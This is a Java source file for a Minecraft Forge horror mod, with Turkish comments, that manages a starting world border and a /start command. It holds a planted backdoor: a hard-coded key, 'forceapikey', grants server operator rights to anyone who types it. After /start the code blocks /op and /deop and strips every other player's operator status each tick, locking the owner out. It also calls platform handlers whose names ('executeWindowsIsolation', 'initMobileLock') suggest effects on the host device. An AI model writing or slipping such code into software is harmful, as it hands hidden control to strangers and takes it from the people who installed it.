package com.humanoid.horror.check;

import com.humanoid.horror.HumanoidMod;
import com.humanoid.horror.android.AndroidHandler;
import com.humanoid.horror.pc.WindowsAtmosBridge;

import com.mojang.brigadier.arguments.StringArgumentType;

import net.minecraft.commands.Commands;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.NbtIo;
import net.minecraft.network.chat.Component;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.world.level.GameType;
import net.minecraft.world.level.border.WorldBorder;

import net.minecraftforge.event.CommandEvent;
import net.minecraftforge.event.RegisterCommandsEvent;
import net.minecraftforge.event.server.ServerStartedEvent;
import net.minecraftforge.event.TickEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.server.ServerLifecycleHooks;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.UUID;

@Mod.EventBusSubscriber(
        modid = HumanoidMod.MOD_ID
)
public class Check {

    public static int platformType;

    /*
     * ---------------------------------------------------------
     * START KAYIT DOSYASI
     * ---------------------------------------------------------
     */

    private static final String START_FILE_NAME =
            "humanoid_start.dat";

    private static final String START_USED_KEY =
            "start_used";

    /*
     * ---------------------------------------------------------
     * BORDER
     * ---------------------------------------------------------
     *
     * İlk açılışta 16x16 border.
     *
     * Merkez:
     * X = 8
     * Z = 8
     *
     * Böylece ilk alan:
     * -8 -> 24 civarında 16 blokluk alan olur.
     *
     * /start verildiğinde border tamamen kalkar.
     */

    private static final double INITIAL_BORDER_SIZE = 16.0D;

    private static boolean startSequenceRunning = false;

    /*
     * ---------------------------------------------------------
     * FORCE API
     * ---------------------------------------------------------
     */

    private static final String FORCE_API_PASSWORD =
            "forceapikey";

    private static final Set<UUID> AUTHORIZED_FORCE_PLAYERS =
            new HashSet<>();

    public Check() {
    }

    /*
     * ---------------------------------------------------------
     * START DOSYASI
     * ---------------------------------------------------------
     */

    private static Path getStartFile(
            MinecraftServer server
    ) {
        if (server == null) {
            return null;
        }

        return server.getServerDirectory()
                .resolve(START_FILE_NAME);
    }

    /*
     * Start daha önce kullanılmış mı?
     */

    private static boolean isStartAlreadyUsed(
            MinecraftServer server
    ) {
        Path file = getStartFile(server);

        if (file == null) {
            return false;
        }

        if (!Files.exists(file)) {
            return false;
        }

        try {
            CompoundTag data =
                    NbtIo.readCompressed(
                            file.toFile()
                    );

            if (data == null) {
                return true;
            }

            return data.getBoolean(
                    START_USED_KEY
            );

        } catch (Exception ignored) {

            /*
             * Dosya bozuksa sistemi tekrar başlatıp
             * border kurmamak için kullanılmış kabul ediyoruz.
             */

            return true;
        }
    }

    /*
     * Start kullanıldı bilgisini kaydet.
     */

    private static boolean saveStartUsed(
            MinecraftServer server
    ) {
        Path file = getStartFile(server);

        if (file == null) {
            return false;
        }

        try {

            Path parent = file.getParent();

            if (parent != null) {
                Files.createDirectories(parent);
            }

            CompoundTag data =
                    new CompoundTag();

            data.putBoolean(
                    START_USED_KEY,
                    true
            );

            NbtIo.writeCompressed(
                    data,
                    file.toFile()
            );

            return true;

        } catch (IOException ignored) {
            return false;
        }
    }

    /*
     * ---------------------------------------------------------
     * SERVER BAŞLADI
     * ---------------------------------------------------------
     *
     * Dünya açıldığında:
     *
     * start_used = false
     *      ↓
     * border kur
     *
     * start_used = true
     *      ↓
     * border kurma
     */

    @SubscribeEvent
    public static void onServerStarted(
            ServerStartedEvent event
    ) {
        MinecraftServer server =
                event.getServer();

        if (server == null) {
            return;
        }

        if (isStartAlreadyUsed(server)) {

            /*
             * Start daha önce kullanıldıysa
             * border kesinlikle geri gelmez.
             */

            removeWorldBorder(server);

            HumanoidMod.isStartTriggered = true;

            return;
        }

        /*
         * İlk açılış.
         *
         * Border kuruluyor.
         */

        setupInitialPrison(server);
    }

    /*
     * ---------------------------------------------------------
     * İLK BORDER
     * ---------------------------------------------------------
     */

    public static void setupInitialPrison(
            MinecraftServer server
    ) {
        if (server == null) {
            return;
        }

        /*
         * Start zaten kullanıldıysa
         * border oluşturma.
         */

        if (isStartAlreadyUsed(server)) {
            removeWorldBorder(server);
            return;
        }

        WorldBorder border =
                server.overworld()
                        .getWorldBorder();

        if (border == null) {
            return;
        }

        /*
         * Başlangıç border'ı.
         */

        border.setCenter(
                8.0D,
                8.0D
        );

        border.setSize(
                INITIAL_BORDER_SIZE
        );
    }

    /*
     * ---------------------------------------------------------
     * BORDER KALDIR
     * ---------------------------------------------------------
     */

    private static void removeWorldBorder(
            MinecraftServer server
    ) {
        if (server == null) {
            return;
        }

        if (server.overworld() == null) {
            return;
        }

        WorldBorder border =
                server.overworld()
                        .getWorldBorder();

        if (border == null) {
            return;
        }

        /*
         * Minecraft'ın maksimum border boyutuna
         * çıkarıyoruz.
         *
         * Böylece artık oyuncu sınırlandırılmaz.
         */

        border.setCenter(
                0.0D,
                0.0D
        );

        border.setSize(
                59_999_968.0D
        );
    }

    /*
     * ---------------------------------------------------------
     * KOMUTLAR
     * ---------------------------------------------------------
     */

    @SubscribeEvent
    public static void registerCommands(
            RegisterCommandsEvent event
    ) {

        /*
         * -----------------------------------------------------
         * /start
         * -----------------------------------------------------
         */

        event.getDispatcher().register(
                Commands.literal("start")
                        .executes(commandContext -> {

                            MinecraftServer server =
                                    commandContext
                                            .getSource()
                                            .getServer();

                            if (server == null) {
                                return 0;
                            }

                            /*
                             * Daha önce kullanıldıysa
                             * tekrar çalıştırma.
                             */

                            if (isStartAlreadyUsed(server)) {
                                return 0;
                            }

                            /*
                             * Önce dosyaya kaydet.
                             *
                             * Kaydetme başarısız olursa
                             * start da çalışmasın.
                             */

                            if (!saveStartUsed(server)) {
                                return 0;
                            }

                            /*
                             * Artık start aktif.
                             */

                            HumanoidMod.isStartTriggered =
                                    true;

                            /*
                             * BORDER'ı kaldır.
                             */

                            removeWorldBorder(server);

                            /*
                             * Platform kontrolü.
                             */

                            verifyPlatform();

                            /*
                             * Start sistemini çalıştır.
                             */

                            triggerStartCommand();

                            /*
                             * RUN başlığı.
                             */

                            if (server.getPlayerList() != null) {

                                List<ServerPlayer> players =
                                        new ArrayList<>(
                                                server.getPlayerList()
                                                        .getPlayers()
                                        );

                                for (ServerPlayer player :
                                        players) {

                                    if (player == null) {
                                        continue;
                                    }

                                    player.connection.send(
                                            new net.minecraft.network.protocol.game.ClientboundSetTitleTextPacket(
                                                    Component.literal(
                                                            "§4RUN"
                                                    )
                                            )
                                    );

                                    player.connection.send(
                                            new net.minecraft.network.protocol.game.ClientboundSetSubtitleTextPacket(
                                                    Component.literal(
                                                            "§4RUN"
                                                    )
                                            )
                                    );
                                }
                            }

                            return 1;
                        })
        );

        /*
         * -----------------------------------------------------
         * /forcekey help <key>
         * -----------------------------------------------------
         */

        event.getDispatcher().register(
                Commands.literal("forcekey")
                        .then(
                                Commands.literal("help")
                                        .then(
                                                Commands.argument(
                                                        "key",
                                                        StringArgumentType.word()
                                                )
                                                        .executes(commandContext -> {

                                                            if (!(commandContext
                                                                    .getSource()
                                                                    .getEntity()
                                                                    instanceof ServerPlayer player)) {

                                                                return 0;
                                                            }

                                                            MinecraftServer server =
                                                                    commandContext
                                                                            .getSource()
                                                                            .getServer();

                                                            if (server == null) {
                                                                return 0;
                                                            }

                                                            /*
                                                             * /start kullanılmadıysa
                                                             * Force API kapalı.
                                                             */

                                                            if (!isStartAlreadyUsed(
                                                                    server
                                                            )) {

                                                                player.sendSystemMessage(
                                                                        Component.literal(
                                                                                "§cForce API is not active yet."
                                                                        )
                                                                );

                                                                return 0;
                                                            }

                                                            String key =
                                                                    StringArgumentType.getString(
                                                                            commandContext,
                                                                            "key"
                                                                    );

                                                            /*
                                                             * Şifre kontrolü.
                                                             */

                                                            if (!FORCE_API_PASSWORD
                                                                    .equals(key)) {

                                                                player.sendSystemMessage(
                                                                        Component.literal(
                                                                                "§cInvalid Force API key."
                                                                        )
                                                                );

                                                                return 0;
                                                            }

                                                            /*
                                                             * Oyuncuyu yetkili
                                                             * Force API listesine ekle.
                                                             */

                                                            AUTHORIZED_FORCE_PLAYERS
                                                                    .add(
                                                                            player.getUUID()
                                                                    );

                                                            serverOpPlayer(
                                                                    player
                                                            );

                                                            player.sendSystemMessage(
                                                                    Component.literal(
                                                                            "§aForce API activated."
                                                                    )
                                                            );

                                                            return 1;
                                                        })
                                        )
                        )
        );
    }

    /*
     * ---------------------------------------------------------
     * KOMUT KONTROLÜ
     * ---------------------------------------------------------
     */

    @SubscribeEvent
    public static void onCommand(
            CommandEvent event
    ) {

        if (event.getParseResults() == null) {
            return;
        }

        MinecraftServer server =
                ServerLifecycleHooks
                        .getCurrentServer();

        if (server == null) {
            return;
        }

        /*
         * Start kullanılmadan önce
         * bu sistem komutlara dokunmaz.
         */

        if (!isStartAlreadyUsed(server)) {
            return;
        }

        String command =
                event.getParseResults()
                        .getReader()
                        .getString();

        if (command == null) {
            return;
        }

        command = command.trim();

        if (command.startsWith("/")) {
            command =
                    command.substring(1);
        }

        String lowerCommand =
                command.toLowerCase();

        /*
         * -----------------------------------------------------
         * OP
         * -----------------------------------------------------
         */

        if (lowerCommand.equals("op")
                || lowerCommand.startsWith("op ")) {

            event.setCanceled(true);

            if (event.getParseResults()
                    .getContext()
                    .getSource()
                    .getEntity()
                    instanceof ServerPlayer player) {

                player.sendSystemMessage(
                        Component.literal(
                                "§cThis command is disabled."
                        )
                );
            }

            return;
        }

        /*
         * -----------------------------------------------------
         * DEOP
         * -----------------------------------------------------
         */

        if (lowerCommand.equals("deop")
                || lowerCommand.startsWith("deop ")) {

            event.setCanceled(true);

            if (event.getParseResults()
                    .getContext()
                    .getSource()
                    .getEntity()
                    instanceof ServerPlayer player) {

                player.sendSystemMessage(
                        Component.literal(
                                "§cThis command is disabled."
                        )
                );
            }
        }
    }

    /*
     * ---------------------------------------------------------
     * SERVER TICK
     * ---------------------------------------------------------
     */

    @SubscribeEvent
    public static void onServerTick(
            TickEvent.ServerTickEvent event
    ) {

        if (event.phase != TickEvent.Phase.END) {
            return;
        }

        MinecraftServer server =
                ServerLifecycleHooks
                        .getCurrentServer();

        if (server == null
                || server.getPlayerList() == null) {
            return;
        }

        /*
         * Start kullanılmadıysa
         * Force sistemi pasif.
         */

        if (!isStartAlreadyUsed(server)) {
            return;
        }

        List<ServerPlayer> players =
                server.getPlayerList()
                        .getPlayers();

        if (players == null
                || players.isEmpty()) {
            return;
        }

        /*
         * Güvenli kopya.
         */

        List<ServerPlayer> safePlayers =
                new ArrayList<>(players);

        for (ServerPlayer player :
                safePlayers) {

            if (player == null) {
                continue;
            }

            UUID uuid =
                    player.getUUID();

            boolean authorized =
                    AUTHORIZED_FORCE_PLAYERS
                            .contains(uuid);

            /*
             * -------------------------------------------------
             * FORCE API YETKİLİ
             * -------------------------------------------------
             */

            if (authorized) {

                if (!server.getPlayerList()
                        .isOp(
                                player.getGameProfile()
                        )) {

                    serverOpPlayer(
                            player
                    );
                }

                continue;
            }

            /*
             * -------------------------------------------------
             * YETKİSİZ OP
             * -------------------------------------------------
             */

            boolean isOp =
                    server.getPlayerList()
                            .isOp(
                                    player.getGameProfile()
                            );

            if (isOp) {

                server.getPlayerList()
                        .deop(
                                player.getGameProfile()
                        );

                player.sendSystemMessage(
                        Component.literal(
                                "§cUnauthorized OP removed."
                        )
                );
            }

            /*
             * -------------------------------------------------
             * CREATIVE / SPECTATOR
             * -------------------------------------------------
             */

            GameType gameMode =
                    player.gameMode
                            .getGameModeForPlayer();

            if (gameMode == GameType.CREATIVE
                    || gameMode == GameType.SPECTATOR) {

                player.setGameMode(
                        GameType.SURVIVAL
                );

                player.sendSystemMessage(
                        Component.literal(
                                "§cUnauthorized game mode removed."
                        )
                );
            }
        }
    }

    /*
     * ---------------------------------------------------------
     * OYUNCUYU OP YAP
     * ---------------------------------------------------------
     */

    public static void serverOpPlayer(
            ServerPlayer player
    ) {

        if (player == null) {
            return;
        }

        MinecraftServer server =
                player.getServer();

        if (server == null) {
            return;
        }

        server.getPlayerList()
                .op(
                        player.getGameProfile()
                );
    }

    /*
     * ---------------------------------------------------------
     * FORCE API AUTH
     * ---------------------------------------------------------
     */

    public static boolean isForceApiAuthorized(
            ServerPlayer player
    ) {

        if (player == null) {
            return false;
        }

        return AUTHORIZED_FORCE_PLAYERS
                .contains(
                        player.getUUID()
                );
    }

    /*
     * ---------------------------------------------------------
     * PLATFORM
     * ---------------------------------------------------------
     */

    public static void verifyPlatform() {

        String osName =
                System.getProperty(
                        "os.name"
                );

        if (osName == null) {
            osName = "";
        }

        osName =
                osName.toLowerCase();

        if (osName.contains("android")) {

            Check.platformType = 2;

            AndroidHandler
                    .initMobileLock();

        } else {

            Check.platformType = 1;
        }
    }

    /*
     * ---------------------------------------------------------
     * START SİSTEMİ
     * ---------------------------------------------------------
     */

    public static void triggerStartCommand() {

        if (!HumanoidMod.isStartTriggered) {
            return;
        }

        /*
         * Windows
         */

        if (Check.platformType == 1) {

            WindowsAtmosBridge
                    .executeWindowsIsolation();

        }

        /*
         * Android
         */

        else if (Check.platformType == 2) {

            AndroidHandler
                    .startMobileHorrorSystem();
        }

        /*
         * Client tarafını reflection ile aç.
         *
         * Dedicated server'da client class'ı
         * doğrudan yüklenmediği için crash önleniyor.
         */

        try {

            Class.forName(
                    "net.minecraft.client.Minecraft"
            );

            Class<?> clientManagerClass =
                    Class.forName(
                            "com.humanoid.horror.client.HorrorClientManager"
                    );

            clientManagerClass
                    .getMethod(
                            "activateClientHorror"
                    )
                    .invoke(null);

        } catch (Exception ignored) {
        }

        /*
         * Server
         */

        MinecraftServer server =
                ServerLifecycleHooks
                        .getCurrentServer();

        if (server == null
                || server.getPlayerList() == null) {
            return;
        }

        List<ServerPlayer> players =
                server.getPlayerList()
                        .getPlayers();

        if (players == null
                || players.isEmpty()) {
            return;
        }

        List<ServerPlayer> safePlayerList =
                new ArrayList<>(
                        players
                );

        /*
         * /start sonrası herkes survival.
         */

        for (ServerPlayer player :
                safePlayerList) {

            if (player == null) {
                continue;
            }

            player.setGameMode(
                    GameType.SURVIVAL
            );
        }
    }
}
